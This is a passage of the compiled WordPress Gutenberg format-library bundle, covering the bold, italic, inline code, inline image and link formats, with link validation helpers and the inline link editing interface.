/******/ (() => { // webpackBootstrap
/******/ 	"use strict";
/******/ 	// The require scope
/******/ 	var __webpack_require__ = {};
/******/ 	
/************************************************************************/
/******/ 	/* webpack/runtime/make namespace object */
/******/ 	(() => {
/******/ 		// define __esModule on exports
/******/ 		__webpack_require__.r = (exports) => {
/******/ 			if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 				Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 			}
/******/ 			Object.defineProperty(exports, '__esModule', { value: true });
/******/ 		};
/******/ 	})();
/******/ 	
/************************************************************************/
var __webpack_exports__ = {};
// ESM COMPAT FLAG
__webpack_require__.r(__webpack_exports__);

;// CONCATENATED MODULE: external ["wp","richText"]
const external_wp_richText_namespaceObject = window["wp"]["richText"];
;// CONCATENATED MODULE: external "React"
const external_React_namespaceObject = window["React"];
;// CONCATENATED MODULE: external ["wp","i18n"]
const external_wp_i18n_namespaceObject = window["wp"]["i18n"];
;// CONCATENATED MODULE: external ["wp","blockEditor"]
const external_wp_blockEditor_namespaceObject = window["wp"]["blockEditor"];
;// CONCATENATED MODULE: external ["wp","primitives"]
const external_wp_primitives_namespaceObject = window["wp"]["primitives"];
;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/format-bold.js

/**
 * WordPress dependencies
 */

const formatBold = (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M14.7 11.3c1-.6 1.5-1.6 1.5-3 0-2.3-1.3-3.4-4-3.4H7v14h5.8c1.4 0 2.5-.3 3.3-1 .8-.7 1.2-1.7 1.2-2.9.1-1.9-.8-3.1-2.6-3.7zm-5.1-4h2.3c.6 0 1.1.1 1.4.4.3.3.5.7.5 1.2s-.2 1-.5 1.2c-.3.3-.8.4-1.4.4H9.6V7.3zm4.6 9c-.4.3-1 .4-1.7.4H9.6v-3.9h2.9c.7 0 1.3.2 1.7.5.4.3.6.8.6 1.5s-.2 1.2-.6 1.5z"
}));
/* harmony default export */ const format_bold = (formatBold);

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/bold/index.js

/**
 * WordPress dependencies
 */




const bold_name = 'core/bold';
const title = (0,external_wp_i18n_namespaceObject.__)('Bold');
const bold = {
  name: bold_name,
  title,
  tagName: 'strong',
  className: null,
  edit({
    isActive,
    value,
    onChange,
    onFocus
  }) {
    function onToggle() {
      onChange((0,external_wp_richText_namespaceObject.toggleFormat)(value, {
        type: bold_name,
        title
      }));
    }
    function onClick() {
      onChange((0,external_wp_richText_namespaceObject.toggleFormat)(value, {
        type: bold_name
      }));
      onFocus();
    }
    return (0,external_React_namespaceObject.createElement)(external_React_namespaceObject.Fragment, null, (0,external_React_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextShortcut, {
      type: "primary",
      character: "b",
      onUse: onToggle
    }), (0,external_React_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextToolbarButton, {
      name: "bold",
      icon: format_bold,
      title: title,
      onClick: onClick,
      isActive: isActive,
      shortcutType: "primary",
      shortcutCharacter: "b"
    }), (0,external_React_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.__unstableRichTextInputEvent, {
      inputType: "formatBold",
      onInput: onToggle
    }));
  }
};

;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/code.js

/**
 * WordPress dependencies
 */

const code = (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  viewBox: "0 0 24 24",
  xmlns: "http://www.w3.org/2000/svg"
}, (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M20.8 10.7l-4.3-4.3-1.1 1.1 4.3 4.3c.1.1.1.3 0 .4l-4.3 4.3 1.1 1.1 4.3-4.3c.7-.8.7-1.9 0-2.6zM4.2 11.8l4.3-4.3-1-1-4.3 4.3c-.7.7-.7 1.8 0 2.5l4.3 4.3 1.1-1.1-4.3-4.3c-.2-.1-.2-.3-.1-.4z"
}));
/* harmony default export */ const library_code = (code);

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/code/index.js

/**
 * WordPress dependencies
 */




const code_name = 'core/code';
const code_title = (0,external_wp_i18n_namespaceObject.__)('Inline code');
const code_code = {
  name: code_name,
  title: code_title,
  tagName: 'code',
  className: null,
  __unstableInputRule(value) {
    const BACKTICK = '`';
    const {
      start,
      text
    } = value;
    const characterBefore = text[start - 1];

    // Quick check the text for the necessary character.
    if (characterBefore !== BACKTICK) {
      return value;
    }
    if (start - 2 < 0) {
      return value;
    }
    const indexBefore = text.lastIndexOf(BACKTICK, start - 2);
    if (indexBefore === -1) {
      return value;
    }
    const startIndex = indexBefore;
    const endIndex = start - 2;
    if (startIndex === endIndex) {
      return value;
    }
    value = (0,external_wp_richText_namespaceObject.remove)(value, startIndex, startIndex + 1);
    value = (0,external_wp_richText_namespaceObject.remove)(value, endIndex, endIndex + 1);
    value = (0,external_wp_richText_namespaceObject.applyFormat)(value, {
      type: code_name
    }, startIndex, endIndex);
    return value;
  },
  edit({
    value,
    onChange,
    onFocus,
    isActive
  }) {
    function onClick() {
      onChange((0,external_wp_richText_namespaceObject.toggleFormat)(value, {
        type: code_name,
        title: code_title
      }));
      onFocus();
    }
    return (0,external_React_namespaceObject.createElement)(external_React_namespaceObject.Fragment, null, (0,external_React_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextShortcut, {
      type: "access",
      character: "x",
      onUse: onClick
    }), (0,external_React_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextToolbarButton, {
      icon: library_code,
      title: code_title,
      onClick: onClick,
      isActive: isActive,
      role: "menuitemcheckbox"
    }));
  }
};

;// CONCATENATED MODULE: external ["wp","components"]
const external_wp_components_namespaceObject = window["wp"]["components"];
;// CONCATENATED MODULE: external ["wp","element"]
const external_wp_element_namespaceObject = window["wp"]["element"];
;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/keyboard-return.js

/**
 * WordPress dependencies
 */

const keyboardReturn = (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "-2 -2 24 24"
}, (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M6.734 16.106l2.176-2.38-1.093-1.028-3.846 4.158 3.846 4.157 1.093-1.027-2.176-2.38h2.811c1.125 0 2.25.03 3.374 0 1.428-.001 3.362-.25 4.963-1.277 1.66-1.065 2.868-2.906 2.868-5.859 0-2.479-1.327-4.896-3.65-5.93-1.82-.813-3.044-.8-4.806-.788l-.567.002v1.5c.184 0 .368 0 .553-.002 1.82-.007 2.704-.014 4.21.657 1.854.827 2.76 2.657 2.76 4.561 0 2.472-.973 3.824-2.178 4.596-1.258.807-2.864 1.04-4.163 1.04h-.02c-1.115.03-2.229 0-3.344 0H6.734z"
}));
/* harmony default export */ const keyboard_return = (keyboardReturn);

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/image/index.js

/**
 * WordPress dependencies
 */






const ALLOWED_MEDIA_TYPES = ['image'];
const image_name = 'core/image';
const image_title = (0,external_wp_i18n_namespaceObject.__)('Inline image');
const image_image = {
  name: image_name,
  title: image_title,
  keywords: [(0,external_wp_i18n_namespaceObject.__)('photo'), (0,external_wp_i18n_namespaceObject.__)('media')],
  object: true,
  tagName: 'img',
  className: null,
  attributes: {
    className: 'class',
    style: 'style',
    url: 'src',
    alt: 'alt'
  },
  edit: Edit
};
function InlineUI({
  value,
  onChange,
  activeObjectAttributes,
  contentRef
}) {
  const {
    style
  } = activeObjectAttributes;
  const [width, setWidth] = (0,external_wp_element_namespaceObject.useState)(style?.replace(/\D/g, ''));
  const popoverAnchor = (0,external_wp_richText_namespaceObject.useAnchor)({
    editableContentElement: contentRef.current,
    settings: image_image
  });
  return (0,external_React_namespaceObject.createElement)(external_wp_components_namespaceObject.Popover, {
    placement: "bottom",
    focusOnMount: false,
    anchor: popoverAnchor,
    className: "block-editor-format-toolbar__image-popover"
  }, (0,external_React_namespaceObject.createElement)("form", {
    className: "block-editor-format-toolbar__image-container-content",
    onSubmit: event => {
      const newReplacements = value.replacements.slice();
      newReplacements[value.start] = {
        type: image_name,
        attributes: {
          ...activeObjectAttributes,
          style: width ? `width: ${width}px;` : ''
        }
      };
      onChange({
        ...value,
        replacements: newReplacements
      });
      event.preventDefault();
    }
  }, (0,external_React_namespaceObject.createElement)(external_wp_components_namespaceObject.__experimentalHStack, {
    alignment: "bottom",
    spacing: "0"
  }, (0,external_React_namespaceObject.createElement)(external_wp_components_namespaceObject.__experimentalNumberControl, {
    className: "block-editor-format-toolbar__image-container-value",
    label: (0,external_wp_i18n_namespaceObject.__)('Width'),
    value: width,
    min: 1,
    onChange: newWidth => setWidth(newWidth)
  }), (0,external_React_namespaceObject.createElement)(external_wp_components_namespaceObject.Button, {
    className: "block-editor-format-toolbar__image-container-button",
    icon: keyboard_return,
    label: (0,external_wp_i18n_namespaceObject.__)('Apply'),
    type: "submit"
  }))));
}
function Edit({
  value,
  onChange,
  onFocus,
  isObjectActive,
  activeObjectAttributes,
  contentRef
}) {
  const [isModalOpen, setIsModalOpen] = (0,external_wp_element_namespaceObject.useState)(false);
  function openModal() {
    setIsModalOpen(true);
  }
  function closeModal() {
    setIsModalOpen(false);
  }
  return (0,external_React_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.MediaUploadCheck, null, (0,external_React_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextToolbarButton, {
    icon: (0,external_React_namespaceObject.createElement)(external_wp_components_namespaceObject.SVG, {
      xmlns: "http://www.w3.org/2000/svg",
      viewBox: "0 0 24 24"
    }, (0,external_React_namespaceObject.createElement)(external_wp_components_namespaceObject.Path, {
      d: "M4 18.5h16V17H4v1.5zM16 13v1.5h4V13h-4zM5.1 15h7.8c.6 0 1.1-.5 1.1-1.1V6.1c0-.6-.5-1.1-1.1-1.1H5.1C4.5 5 4 5.5 4 6.1v7.8c0 .6.5 1.1 1.1 1.1zm.4-8.5h7V10l-1-1c-.3-.3-.8-.3-1 0l-1.6 1.5-1.2-.7c-.3-.2-.6-.2-.9 0l-1.3 1V6.5zm0 6.1l1.8-1.3 1.3.8c.3.2.7.2.9-.1l1.5-1.4 1.5 1.4v1.5h-7v-.9z"
    })),
    title: image_title,
    onClick: openModal,
    isActive: isObjectActive
  }), isModalOpen && (0,external_React_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.MediaUpload, {
    allowedTypes: ALLOWED_MEDIA_TYPES,
    onSelect: ({
      id,
      url,
      alt,
      width: imgWidth
    }) => {
      closeModal();
      onChange((0,external_wp_richText_namespaceObject.insertObject)(value, {
        type: image_name,
        attributes: {
          className: `wp-image-${id}`,
          style: `width: ${Math.min(imgWidth, 150)}px;`,
          url,
          alt
        }
      }));
      onFocus();
    },
    onClose: closeModal,
    render: ({
      open
    }) => {
      open();
      return null;
    }
  }), isObjectActive && (0,external_React_namespaceObject.createElement)(InlineUI, {
    value: value,
    onChange: onChange,
    activeObjectAttributes: activeObjectAttributes,
    contentRef: contentRef
  }));
}

;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/format-italic.js

/**
 * WordPress dependencies
 */

const formatItalic = (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M12.5 5L10 19h1.9l2.5-14z"
}));
/* harmony default export */ const format_italic = (formatItalic);

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/italic/index.js

/**
 * WordPress dependencies
 */




const italic_name = 'core/italic';
const italic_title = (0,external_wp_i18n_namespaceObject.__)('Italic');
const italic = {
  name: italic_name,
  title: italic_title,
  tagName: 'em',
  className: null,
  edit({
    isActive,
    value,
    onChange,
    onFocus
  }) {
    function onToggle() {
      onChange((0,external_wp_richText_namespaceObject.toggleFormat)(value, {
        type: italic_name,
        title: italic_title
      }));
    }
    function onClick() {
      onChange((0,external_wp_richText_namespaceObject.toggleFormat)(value, {
        type: italic_name
      }));
      onFocus();
    }
    return (0,external_React_namespaceObject.createElement)(external_React_namespaceObject.Fragment, null, (0,external_React_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextShortcut, {
      type: "primary",
      character: "i",
      onUse: onToggle
    }), (0,external_React_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.RichTextToolbarButton, {
      name: "italic",
      icon: format_italic,
      title: italic_title,
      onClick: onClick,
      isActive: isActive,
      shortcutType: "primary",
      shortcutCharacter: "i"
    }), (0,external_React_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.__unstableRichTextInputEvent, {
      inputType: "formatItalic",
      onInput: onToggle
    }));
  }
};

;// CONCATENATED MODULE: external ["wp","url"]
const external_wp_url_namespaceObject = window["wp"]["url"];
;// CONCATENATED MODULE: external ["wp","htmlEntities"]
const external_wp_htmlEntities_namespaceObject = window["wp"]["htmlEntities"];
;// CONCATENATED MODULE: ./node_modules/@wordpress/icons/build-module/library/link.js

/**
 * WordPress dependencies
 */

const link_link = (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.SVG, {
  xmlns: "http://www.w3.org/2000/svg",
  viewBox: "0 0 24 24"
}, (0,external_React_namespaceObject.createElement)(external_wp_primitives_namespaceObject.Path, {
  d: "M10 17.389H8.444A5.194 5.194 0 1 1 8.444 7H10v1.5H8.444a3.694 3.694 0 0 0 0 7.389H10v1.5ZM14 7h1.556a5.194 5.194 0 0 1 0 10.39H14v-1.5h1.556a3.694 3.694 0 0 0 0-7.39H14V7Zm-4.5 6h5v-1.5h-5V13Z"
}));
/* harmony default export */ const library_link = (link_link);

;// CONCATENATED MODULE: external ["wp","a11y"]
const external_wp_a11y_namespaceObject = window["wp"]["a11y"];
;// CONCATENATED MODULE: external ["wp","data"]
const external_wp_data_namespaceObject = window["wp"]["data"];
;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/link/utils.js
/**
 * WordPress dependencies
 */


/**
 * Check for issues with the provided href.
 *
 * @param {string} href The href.
 *
 * @return {boolean} Is the href invalid?
 */
function isValidHref(href) {
  if (!href) {
    return false;
  }
  const trimmedHref = href.trim();
  if (!trimmedHref) {
    return false;
  }

  // Does the href start with something that looks like a URL protocol?
  if (/^\S+:/.test(trimmedHref)) {
    const protocol = (0,external_wp_url_namespaceObject.getProtocol)(trimmedHref);
    if (!(0,external_wp_url_namespaceObject.isValidProtocol)(protocol)) {
      return false;
    }

    // Add some extra checks for http(s) URIs, since these are the most common use-case.
    // This ensures URIs with an http protocol have exactly two forward slashes following the protocol.
    if (protocol.startsWith('http') && !/^https?:\/\/[^\/\s]/i.test(trimmedHref)) {
      return false;
    }
    const authority = (0,external_wp_url_namespaceObject.getAuthority)(trimmedHref);
    if (!(0,external_wp_url_namespaceObject.isValidAuthority)(authority)) {
      return false;
    }
    const path = (0,external_wp_url_namespaceObject.getPath)(trimmedHref);
    if (path && !(0,external_wp_url_namespaceObject.isValidPath)(path)) {
      return false;
    }
    const queryString = (0,external_wp_url_namespaceObject.getQueryString)(trimmedHref);
    if (queryString && !(0,external_wp_url_namespaceObject.isValidQueryString)(queryString)) {
      return false;
    }
    const fragment = (0,external_wp_url_namespaceObject.getFragment)(trimmedHref);
    if (fragment && !(0,external_wp_url_namespaceObject.isValidFragment)(fragment)) {
      return false;
    }
  }

  // Validate anchor links.
  if (trimmedHref.startsWith('#') && !(0,external_wp_url_namespaceObject.isValidFragment)(trimmedHref)) {
    return false;
  }
  return true;
}

/**
 * Generates the format object that will be applied to the link text.
 *
 * @param {Object}  options
 * @param {string}  options.url              The href of the link.
 * @param {string}  options.type             The type of the link.
 * @param {string}  options.id               The ID of the link.
 * @param {boolean} options.opensInNewWindow Whether this link will open in a new window.
 * @param {boolean} options.nofollow         Whether this link is marked as no follow relationship.
 * @return {Object} The final format object.
 */
function createLinkFormat({
  url,
  type,
  id,
  opensInNewWindow,
  nofollow
}) {
  const format = {
    type: 'core/link',
    attributes: {
      url
    }
  };
  if (type) format.attributes.type = type;
  if (id) format.attributes.id = id;
  if (opensInNewWindow) {
    format.attributes.target = '_blank';
    format.attributes.rel = format.attributes.rel ? format.attributes.rel + ' noreferrer noopener' : 'noreferrer noopener';
  }
  if (nofollow) {
    format.attributes.rel = format.attributes.rel ? format.attributes.rel + ' nofollow' : 'nofollow';
  }
  return format;
}

/* eslint-disable jsdoc/no-undefined-types */
/**
 * Get the start and end boundaries of a given format from a rich text value.
 *
 *
 * @param {RichTextValue} value      the rich text value to interrogate.
 * @param {string}        format     the identifier for the target format (e.g. `core/link`, `core/bold`).
 * @param {number?}       startIndex optional startIndex to seek from.
 * @param {number?}       endIndex   optional endIndex to seek from.
 * @return {Object}	object containing start and end values for the given format.
 */
/* eslint-enable jsdoc/no-undefined-types */
function getFormatBoundary(value, format, startIndex = value.start, endIndex = value.end) {
  const EMPTY_BOUNDARIES = {
    start: null,
    end: null
  };
  const {
    formats
  } = value;
  let targetFormat;
  let initialIndex;
  if (!formats?.length) {
    return EMPTY_BOUNDARIES;
  }

  // Clone formats to avoid modifying source formats.
  const newFormats = formats.slice();
  const formatAtStart = newFormats[startIndex]?.find(({
    type
  }) => type === format.type);
  const formatAtEnd = newFormats[endIndex]?.find(({
    type
  }) => type === format.type);
  const formatAtEndMinusOne = newFormats[endIndex - 1]?.find(({
    type
  }) => type === format.type);
  if (!!formatAtStart) {
    // Set values to conform to "start"
    targetFormat = formatAtStart;
    initialIndex = startIndex;
  } else if (!!formatAtEnd) {
    // Set values to conform to "end"
    targetFormat = formatAtEnd;
    initialIndex = endIndex;
  } else if (!!formatAtEndMinusOne) {
    // This is an edge case which will occur if you create a format, then place
    // the caret just before the format and hit the back ARROW key. The resulting
    // value object will have start and end +1 beyond the edge of the format boundary.
    targetFormat = formatAtEndMinusOne;
    initialIndex = endIndex - 1;
  } else {
    return EMPTY_BOUNDARIES;
  }
  const index = newFormats[initialIndex].indexOf(targetFormat);
  const walkingArgs = [newFormats, initialIndex, targetFormat, index];

  // Walk the startIndex "backwards" to the leading "edge" of the matching format.
  startIndex = walkToStart(...walkingArgs);

  // Walk the endIndex "forwards" until the trailing "edge" of the matching format.
  endIndex = walkToEnd(...walkingArgs);

  // Safe guard: start index cannot be less than 0.
  startIndex = startIndex < 0 ? 0 : startIndex;

  // // Return the indicies of the "edges" as the boundaries.
  return {
    start: startIndex,
    end: endIndex
  };
}

/**
 * Walks forwards/backwards towards the boundary of a given format within an
 * array of format objects. Returns the index of the boundary.
 *
 * @param {Array}  formats         the formats to search for the given format type.
 * @param {number} initialIndex    the starting index from which to walk.
 * @param {Object} targetFormatRef a reference to the format type object being sought.
 * @param {number} formatIndex     the index at which we expect the target format object to be.
 * @param {string} direction       either 'forwards' or 'backwards' to indicate the direction.
 * @return {number} the index of the boundary of the given format.
 */
function walkToBoundary(formats, initialIndex, targetFormatRef, formatIndex, direction) {
  let index = initialIndex;
  const directions = {
    forwards: 1,
    backwards: -1
  };
  const directionIncrement = directions[direction] || 1; // invalid direction arg default to forwards
  const inverseDirectionIncrement = directionIncrement * -1;
  while (formats[index] && formats[index][formatIndex] === targetFormatRef) {
    // Increment/decrement in the direction of operation.
    index = index + directionIncrement;
  }

  // Restore by one in inverse direction of operation
  // to avoid out of bounds.
  index = index + inverseDirectionIncrement;
  return index;
}
const partialRight = (fn, ...partialArgs) => (...args) => fn(...args, ...partialArgs);
const walkToStart = partialRight(walkToBoundary, 'backwards');
const walkToEnd = partialRight(walkToBoundary, 'forwards');

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/link/inline.js

/**
 * WordPress dependencies
 */









/**
 * Internal dependencies
 */


const LINK_SETTINGS = [...external_wp_blockEditor_namespaceObject.__experimentalLinkControl.DEFAULT_LINK_SETTINGS, {
  id: 'nofollow',
  title: (0,external_wp_i18n_namespaceObject.__)('Mark as nofollow')
}];
function InlineLinkUI({
  isActive,
  activeAttributes,
  value,
  onChange,
  onFocusOutside,
  stopAddingLink,
  contentRef,
  focusOnMount
}) {
  const richLinkTextValue = getRichTextValueFromSelection(value, isActive);

  // Get the text content minus any HTML tags.
  const richTextText = richLinkTextValue.text;
  const {
    selectionChange
  } = (0,external_wp_data_namespaceObject.useDispatch)(external_wp_blockEditor_namespaceObject.store);
  const {
    createPageEntity,
    userCanCreatePages,
    selectionStart
  } = (0,external_wp_data_namespaceObject.useSelect)(select => {
    const {
      getSettings,
      getSelectionStart
    } = select(external_wp_blockEditor_namespaceObject.store);
    const _settings = getSettings();
    return {
      createPageEntity: _settings.__experimentalCreatePageEntity,
      userCanCreatePages: _settings.__experimentalUserCanCreatePages,
      selectionStart: getSelectionStart()
    };
  }, []);
  const linkValue = (0,external_wp_element_namespaceObject.useMemo)(() => ({
    url: activeAttributes.url,
    type: activeAttributes.type,
    id: activeAttributes.id,
    opensInNewTab: activeAttributes.target === '_blank',
    nofollow: activeAttributes.rel?.includes('nofollow'),
    title: richTextText
  }), [activeAttributes.id, activeAttributes.rel, activeAttributes.target, activeAttributes.type, activeAttributes.url, richTextText]);
  function removeLink() {
    const newValue = (0,external_wp_richText_namespaceObject.removeFormat)(value, 'core/link');
    onChange(newValue);
    stopAddingLink();
    (0,external_wp_a11y_namespaceObject.speak)((0,external_wp_i18n_namespaceObject.__)('Link removed.'), 'assertive');
  }
  function onChangeLink(nextValue) {
    const hasLink = linkValue?.url;
    const isNewLink = !hasLink;

    // Merge the next value with the current link value.
    nextValue = {
      ...linkValue,
      ...nextValue
    };
    const newUrl = (0,external_wp_url_namespaceObject.prependHTTP)(nextValue.url);
    const linkFormat = createLinkFormat({
      url: newUrl,
      type: nextValue.type,
      id: nextValue.id !== undefined && nextValue.id !== null ? String(nextValue.id) : undefined,
      opensInNewWindow: nextValue.opensInNewTab,
      nofollow: nextValue.nofollow
    });
    const newText = nextValue.title || newUrl;

    // Scenario: we have any active text selection or an active format.
    let newValue;
    if ((0,external_wp_richText_namespaceObject.isCollapsed)(value) && !isActive) {
      // Scenario: we don't have any actively selected text or formats.
      const inserted = (0,external_wp_richText_namespaceObject.insert)(value, newText);
      newValue = (0,external_wp_richText_namespaceObject.applyFormat)(inserted, linkFormat, value.start, value.start + newText.length);
      onChange(newValue);

      // Close the Link UI.
      stopAddingLink();

      // Move the selection to the end of the inserted link outside of the format boundary
      // so the user can continue typing after the link.
      selectionChange({
        clientId: selectionStart.clientId,
        identifier: selectionStart.attributeKey,
        start: value.start + newText.length + 1
      });
      return;
    } else if (newText === richTextText) {
      newValue = (0,external_wp_richText_namespaceObject.applyFormat)(value, linkFormat);
    } else {
      // Scenario: Editing an existing link.

      // Create new RichText value for the new text in order that we
      // can apply formats to it.
      newValue = (0,external_wp_richText_namespaceObject.create)({
        text: newText
      });
      // Apply the new Link format to this new text value.
      newValue = (0,external_wp_richText_namespaceObject.applyFormat)(newValue, linkFormat, 0, newText.length);

      // Get the boundaries of the active link format.
      const boundary = getFormatBoundary(value, {
        type: 'core/link'
      });

      // Split the value at the start of the active link format.
      // Passing "start" as the 3rd parameter is required to ensure
      // the second half of the split value is split at the format's
      // start boundary and avoids relying on the value's "end" property
      // which may not correspond correctly.
      const [valBefore, valAfter] = (0,external_wp_richText_namespaceObject.split)(value, boundary.start, boundary.start);

      // Update the original (full) RichTextValue replacing the
      // target text with the *new* RichTextValue containing:
      // 1. The new text content.
      // 2. The new link format.
      // As "replace" will operate on the first match only, it is
      // run only against the second half of the value which was
      // split at the active format's boundary. This avoids a bug
      // with incorrectly targetted replacements.
      // See: https://github.com/WordPress/gutenberg/issues/41771.
      // Note original formats will be lost when applying this change.
      // That is expected behaviour.
      // See: https://github.com/WordPress/gutenberg/pull/33849#issuecomment-936134179.
      const newValAfter = (0,external_wp_richText_namespaceObject.replace)(valAfter, richTextText, newValue);
      newValue = (0,external_wp_richText_namespaceObject.concat)(valBefore, newValAfter);
    }
    onChange(newValue);

    // Focus should only be returned to the rich text on submit if this link is not
    // being created for the first time. If it is then focus should remain within the
    // Link UI because it should remain open for the user to modify the link they have
    // just created.
    if (!isNewLink) {
      stopAddingLink();
    }
    if (!isValidHref(newUrl)) {
      (0,external_wp_a11y_namespaceObject.speak)((0,external_wp_i18n_namespaceObject.__)('Warning: the link has been inserted but may have errors. Please test it.'), 'assertive');
    } else if (isActive) {
      (0,external_wp_a11y_namespaceObject.speak)((0,external_wp_i18n_namespaceObject.__)('Link edited.'), 'assertive');
    } else {
      (0,external_wp_a11y_namespaceObject.speak)((0,external_wp_i18n_namespaceObject.__)('Link inserted.'), 'assertive');
    }
  }
  const popoverAnchor = (0,external_wp_richText_namespaceObject.useAnchor)({
    editableContentElement: contentRef.current,
    settings: {
      ...build_module_link_link,
      isActive
    }
  });
  async function handleCreate(pageTitle) {
    const page = await createPageEntity({
      title: pageTitle,
      status: 'draft'
    });
    return {
      id: page.id,
      type: page.type,
      title: page.title.rendered,
      url: page.link,
      kind: 'post-type'
    };
  }
  function createButtonText(searchTerm) {
    return (0,external_wp_element_namespaceObject.createInterpolateElement)((0,external_wp_i18n_namespaceObject.sprintf)( /* translators: %s: search term. */
    (0,external_wp_i18n_namespaceObject.__)('Create page: <mark>%s</mark>'), searchTerm), {
      mark: (0,external_React_namespaceObject.createElement)("mark", null)
    });
  }
  return (0,external_React_namespaceObject.createElement)(external_wp_components_namespaceObject.Popover, {
    anchor: popoverAnchor,
    onClose: stopAddingLink,
    onFocusOutside: onFocusOutside,
    placement: "bottom",
    offset: 10,
    shift: true,
    focusOnMount: focusOnMount,
    constrainTabbing: true
  }, (0,external_React_namespaceObject.createElement)(external_wp_blockEditor_namespaceObject.__experimentalLinkControl, {
    value: linkValue,
    onChange: onChangeLink,
    onRemove: removeLink,
    hasRichPreviews: true,
    createSuggestion: createPageEntity && handleCreate,
    withCreateSuggestion: userCanCreatePages,
    createSuggestionButtonText: createButtonText,
    hasTextControl: true,
    settings: LINK_SETTINGS,
    showInitialSuggestions: true,
    suggestionsQuery: {
      // always show Pages as initial suggestions
      initialSuggestionsSearchOptions: {
        type: 'post',
        subtype: 'page',
        perPage: 20
      }
    }
  }));
}
function getRichTextValueFromSelection(value, isActive) {
  // Default to the selection ranges on the RichTextValue object.
  let textStart = value.start;
  let textEnd = value.end;

  // If the format is currently active then the rich text value
  // should always be taken from the bounds of the active format
  // and not the selected text.
  if (isActive) {
    const boundary = getFormatBoundary(value, {
      type: 'core/link'
    });
    textStart = boundary.start;

    // Text *selection* always extends +1 beyond the edge of the format.
    // We account for that here.
    textEnd = boundary.end + 1;
  }

  // Get a RichTextValue containing the selected text content.
  return (0,external_wp_richText_namespaceObject.slice)(value, textStart, textEnd);
}
/* harmony default export */ const inline = (InlineLinkUI);

;// CONCATENATED MODULE: ./node_modules/@wordpress/format-library/build-module/link/index.js

/**
 * WordPress dependencies
 */









/**
 * Internal dependencies
 */


const link_name = 'core/link';
const link_title = (0,external_wp_i18n_namespaceObject.__)('Link');
function link_Edit({
  isActive,
  activeAttributes,
  value,
  onChange,
  onFocus,
  contentRef
}) {
  const [editingLink, setEditingLink] = (0,external_wp_element_namespaceObject.useState)(false);
  const [creatingLink, setCreatingLink] = (0,external_wp_element_namespaceObject.useState)(false);

  // We only need to store the button element that opened the popover. We can ignore the other states, as they will be handled by the onFocus prop to return to the rich text field.
  const [openedBy, setOpenedBy] = (0,external_wp_element_namespaceObject.useState)(null);

  // Manages whether the Link UI popover should autofocus when shown.
  const [shouldAutoFocus, setShouldAutoFocus] = (0,external_wp_element_namespaceObject.useState)(true);
  function setIsEditingLink(isEditing, {
    autoFocus = true
  } = {}) {
    setEditingLink(isEditing);
    setShouldAutoFocus(autoFocus);
  }
  function setIsCreatingLink(isCreating) {
    // Don't add a new link if there is already an active link.
    // The two states are mutually exclusive.
    if (isCreating === true && isActive) {
      return;
    }
    setCreatingLink(isCreating);
  }
  (0,external_wp_element_namespaceObject.useEffect)(() => {
    // When the link becomes inactive (i.e. isActive is false), reset the editingLink state
    // and the creatingLink state. This means that if the Link UI is displayed and the link
    // becomes inactive (e.g. used arrow keys to move cursor outside of link bounds), the UI will close.
    if (!isActive) {
      setEditingLink(false);
      setCreatingLink(false);
    }
  }, [isActive]);
  (0,external_wp_element_namespaceObject.useLayoutEffect)(() => {
    const editableContentElement = contentRef.current;
    if (!editableContentElement) {
      return;
    }
    function handleClick(event) {
      // There is a situation whereby there is an existing link in the rich text
      // and the user clicks on the leftmost edge of that link and fails to activate
      // the link format, but the click event still fires on the `<a>` element.
      // This causes the `editingLink` state to be set to `true` and the link UI
      // to be rendered in "creating" mode. We need to check isActive to see if
      // we have an active link format.
      if (!event.target.closest('[contenteditable] a') ||
      // other formats (e.g. bold) may be nested within the link.
      !isActive) {
        setIsEditingLink(false);
        return;
      }
      setIsEditingLink(true, {
        autoFocus: false
      });
    }
    editableContentElement.addEventListener('click', handleClick);
    return () => {
      editableContentElement.removeEventListener('click', handleClick);
    };
  }, [contentRef, isActive]);
  function addLink(target) {
    setShouldAutoFocus(true);
    const text = (0,external_wp_richText_namespaceObject.getTextContent)((0,external_wp_richText_namespaceObject.slice)(value));
    if (!isActive && text && (0,external_wp_url_namespaceObject.isURL)(text) && isValidHref(text)) {
      onChange((0,external_wp_richText_namespaceObject.applyFormat)(value, {
        type: link_name,
        attributes: {
          url: text
        }
      }));
